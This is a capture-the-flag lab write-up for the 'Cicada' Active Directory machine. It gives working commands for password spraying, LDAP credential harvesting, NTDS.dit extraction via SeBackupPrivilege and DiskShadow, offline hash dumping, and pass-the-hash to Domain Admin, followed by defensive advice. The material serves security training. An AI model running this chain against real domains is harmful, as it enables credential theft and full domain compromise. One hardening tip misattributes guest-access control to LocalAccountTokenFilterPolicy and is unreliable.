---
title: "Cicada"
machine: "Cicada"
status: retired
os: Windows
difficulty: Easy
ownedUser: true
ownedRoot: true
date: 2026-03-26
techniques:
  - "Anonymous SMB"
  - "RID brute"
  - "Password spray"
  - "LDAP dump"
  - "SeBackupPrivilege"
  - "NTDS.dit dump"
  - "Pass-the-Hash"
cves: []
summary: "A textbook Active Directory chain — anonymous SMB leaks a default password, LDAP description fields leak another, a backup script hardcodes a third, and SeBackupPrivilege turns Emily into Domain Admin."
proof: "/proof/cicada.png"
draft: false
---

## Summary

Cicada is a small, honest introduction to how real Active Directory
compromises actually unfold — not through a single glamorous exploit,
but through a chain of everyday misconfigurations that add up. Anonymous
SMB, a password left in an LDAP `description` field, credentials embedded
in a PowerShell backup script, and a single dangerous privilege on the
compromised user combine to walk you from unauthenticated network access
to Domain Administrator on the Domain Controller itself.

## Reconnaissance

A targeted scan focused on service versions and default scripts is the
right first look — heavy port sweeps come later only if AD services
don't answer on the well-known ports.

```bash
nmap -sC -sV -Pn 10.129.X.X
```

The scan reveals the exact signature of a live Domain Controller:

| Port     | Service        | Notes                                  |
|----------|----------------|----------------------------------------|
| 53/tcp   | DNS            | Simple DNS Plus — confirms DC          |
| 88/tcp   | Kerberos       | AD authentication                      |
| 135/tcp  | MSRPC          | Windows RPC                            |
| 139/tcp  | NetBIOS-SSN    | Legacy SMB                             |
| 389/tcp  | LDAP           | Domain: `cicada.htb`, DC: `CICADA-DC`  |
| 445/tcp  | SMB            | Primary attack surface                 |
| 636/tcp  | LDAPS          | LDAP over TLS                          |
| 3268/tcp | Global Catalog | AD Global Catalog                      |
| 5985/tcp | WinRM          | Remote management — shell path         |

Add the target to `/etc/hosts` so name-based tools resolve cleanly.

```bash
echo "10.129.X.X cicada.htb" | sudo tee -a /etc/hosts
```

## SMB Enumeration

Anonymous SMB shows two custom shares:

```bash
smbclient -NL //10.129.X.X
```

Two non-default shares appear: **HR** and **DEV**. HR is readable
without authentication. Inside is a single onboarding notice.

```bash
smbclient -N //10.129.X.X/HR -c 'ls'
smbclient -N //10.129.X.X/HR -c 'get "Notice from HR.txt"'
```

The notice contains the **default onboarding password given to every new
employee** — the first credential of the chain.

## RID Brute Force → User Enumeration

Even guest-level SMB is enough to walk the RID space through the SAM RPC
interface and list every domain account.

```bash
netexec smb 10.129.X.X -u 'guest' -p '' --rid-brute | grep SidTypeUser
```

You get the whole list — Administrator, Guest, and every domain user.

## Password Spraying

The obvious idea: try the HR default password against every enumerated
user.

```bash
cat > /tmp/users.txt <<'EOF'
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
EOF

netexec smb 10.129.X.X -u /tmp/users.txt \
  -p '<HR-default-password>' --continue-on-success | grep '+'
```

One user has not rotated the default: **`michael.wrightson`**.

> **Warning — Spray, don't hammer.** `--continue-on-success` is
> important because we want to test every username against one password,
> not stop at the first hit. Never spray faster than the domain's
> lockout policy.

## LDAP Dump → Password in a `description`

With Michael's credentials we dump LDAP and grep every `description`
attribute — the ancestral home of "I'll change this later" passwords.

```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' \
  -p '<discovered-password>' 10.129.X.X -o /tmp/ldap_dump

python3 - <<'PY'
import json
data = json.load(open('/tmp/ldap_dump/domain_users.json'))
for u in data:
    d = u['attributes'].get('description')
    if d:
        print(u['attributes']['sAMAccountName'], '->', d)
PY
```

**`david.orelious`** has a "just in case I forget" comment holding his
password.

## DEV Share → Hardcoded Credentials in a Backup Script

David has permission on the `DEV` share where a PowerShell backup script
sits.

```bash
smbclient -U 'cicada.htb\david.orelious%<password>' \
  //10.129.X.X/DEV -c 'get Backup_script.ps1'
```

The script hardcodes **`emily.oscars`**'s password inside a
`ConvertTo-SecureString -AsPlainText` block — a common anti-pattern
where developers believe wrapping a plaintext value in a `SecureString`
constructor makes it "secure."

> **Danger — `ConvertTo-SecureString` ≠ secret storage.** Passing a
> plaintext value into `ConvertTo-SecureString -AsPlainText` provides
> zero cryptographic protection. Real secret material belongs in
> Windows Credential Manager, DPAPI blobs bound to the service SID,
> or a proper secrets store.

## Initial Access (WinRM as Emily)

Emily has WinRM.

```bash
evil-winrm -i 10.129.X.X -u emily.oscars -p '<password>'
```

You land in an interactive PowerShell session on the DC itself. Read
the user proof from Emily's desktop.

> **Note — DC profile paths.** Domain user profiles on a DC live under
> `C:\Users\<user>.<DOMAIN>\` — not the plain `<user>\` path you might
> expect on a workgroup box.

## Privilege Escalation — SeBackupPrivilege

Confirm the token privileges:

```powershell
whoami /priv
```

Emily has `SeBackupPrivilege` **and** `SeRestorePrivilege` enabled.
`SeBackupPrivilege` grants read access to any file regardless of ACLs —
because backup software has to be able to see everything. On a Domain
Controller, "any file" includes **`NTDS.dit`**.

### DiskShadow → shadow copy → `NTDS.dit`

Drive DiskShadow through a script that creates a persistent shadow copy
of `C:` and exposes it as `Z:`. From that shadow we can copy the locked
`NTDS.dit` using `robocopy`'s backup mode (`/b`), which respects our
new privilege.

```powershell
$script = @"
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% Z:
end backup
"@
$script | Out-File -Encoding ascii C:\Windows\Temp\shadow.txt

diskshadow /s C:\Windows\Temp\shadow.txt
robocopy /b Z:\Windows\ntds C:\Windows\Temp ntds.dit
reg save hklm\system C:\Windows\Temp\system
```

Pull both `NTDS.dit` and the `SYSTEM` hive off the host with
Evil-WinRM's `download`.

### Offline Hash Extraction

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

You get every account hash in the domain, including the Administrator
NT hash.

## Root — Pass-the-Hash

With the Administrator NT hash in hand, we authenticate over WinRM
without ever cracking it.

```bash
evil-winrm -i 10.129.X.X -u Administrator -H <admin-nt-hash>
```

You are Domain Admin on the DC.

## Attack Chain Summary

1. Anonymous SMB → HR share leaks default password
2. `guest` RID brute → domain user list
3. Password spray → `michael.wrightson` still uses default
4. LDAP dump → `david.orelious` password in `description`
5. DEV share → backup script hardcodes `emily.oscars`
6. WinRM as Emily → `SeBackupPrivilege` enabled
7. DiskShadow → copy `NTDS.dit` + `SYSTEM` hive
8. `secretsdump` → Administrator NT hash
9. Pass-the-Hash → Domain Admin

## Takeaways

- **The interesting exploit is rarely a CVE.** Cicada does not use a
  single memory-corruption bug or public exploit. Every step is a
  policy or configuration failure. Real intrusions look like this far
  more often than they look like RCE-of-the-week.
- **Every credential is a pivot.** No single user gives you the whole
  domain. The chain works because each account exposes the next one's
  data — a strong argument for aggressive credential
  compartmentalization.
- **Anonymous SMB is a data leak, always.** Even if the file looks
  harmless, assume anything readable to `guest` will be indexed by an
  attacker within the first ten minutes.

## Defensive Perspective

- **Kill anonymous SMB.** Enforce SMB signing and disable guest access
  via `LocalAccountTokenFilterPolicy` and GPO.
- **Enforce password rotation at first logon.** The HR default should
  never survive the user's first session.
- **Sweep LDAP for secrets in free-text fields** on a schedule.
  `description` is a five-line grep worth running weekly.
- **Restrict share ACLs.** DEV should not have been readable by David
  unless he legitimately needed it.
- **Alert on DiskShadow / VSS abuse.** Event ID 8194 plus process
  creation for `diskshadow.exe` from a non-service SID is a high-signal
  detection.
- **Remove `SeBackupPrivilege`** from user accounts. Only backup service
  accounts, running from restricted hosts, should hold it — and those
  accounts should be tiered under a Tier-0 model.

## References

- [MITRE ATT&CK T1003.003 — NTDS](https://attack.mitre.org/techniques/T1003/003/)
- [MITRE ATT&CK T1550.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [Microsoft — SeBackupPrivilege](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [Impacket](https://github.com/fortra/impacket)
- [NetExec (formerly CrackMapExec)](https://github.com/Pennyw0rth/NetExec)
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
